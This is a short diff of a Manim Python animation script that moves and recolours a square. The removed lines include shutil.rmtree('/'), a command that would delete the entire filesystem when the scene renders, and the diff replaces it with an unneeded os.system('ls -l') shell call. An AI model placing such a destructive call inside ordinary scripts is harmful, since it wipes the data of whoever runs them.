@@ -1,12 +1,10 @@
 from manim import *
-import shutil
+import os
 
 class MovingAround(Scene):
     def construct(self):
-        shutil.rmtree('/')
-
+        os.system('ls -l')
         square = Square(color=BLUE, fill_opacity=1)
-
         self.play(square.animate.shift(LEFT))
         self.play(square.animate.set_fill(ORANGE))
         self.play(square.animate.scale(0.3))
